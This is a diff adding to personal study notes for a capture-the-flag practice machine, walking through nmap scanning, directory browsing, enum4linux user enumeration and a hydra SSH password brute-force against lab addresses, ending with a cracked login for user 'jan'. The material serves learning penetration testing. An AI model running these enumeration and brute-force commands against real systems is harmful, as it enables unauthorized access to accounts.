@@ -17,6 +17,9 @@
 This is a machine that allows you to practise web app hacking and privilege escalation הַסְלָמָה 
  https://youtu.be/xl2Xx5YOKcI?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=419
  
+ 
+ Run  server:   openvpn  <name of ovpn.ovpn>
+
  ip:  10.10.43.220     #10.10.205.158
 1. ping    10.10.43.220
 2. nmap -sC -sV -oN   ./initial   10.10.43.220
@@ -49,4 +52,27 @@ results:
 	open http://10.10.43.220/development/
    results:  2 files  	dev.txt	,j.txt
    
-    https://youtu.be/xl2Xx5YOKcI?t=780    
+    open http://10.10.151.122/server-status
+     results: Forbidden  Apache/2.4.41 (Ubuntu) Server at 10.10.151.122 Port 80
+	 
+	 
+	 
+6.enum4linux  (similar    to enum.exe  )
+	 enum4linux -a <ip> #10.10.151.122
+
+results:
+   A very long list. At the end tou fill the next lines:
+   [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+		S-1-22-1-1000 Unix User\kay (Local User)
+		S-1-22-1-1001 Unix User\jan (Local User)
+		S-1-22-1-1002 Unix User\ubuntu (Local User)
+   
+   
+7.  sudo hydra -l   <user name>  -P  <word list file>  ssh<ip>
+   sudo hydra -l   jan   -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  ssh://10.10.151.122
+ 
+
+   results:   [22][ssh] host: 10.10.151.122     login: jan      password: armando
+   
+   https://youtu.be/xl2Xx5YOKcI?t=1107
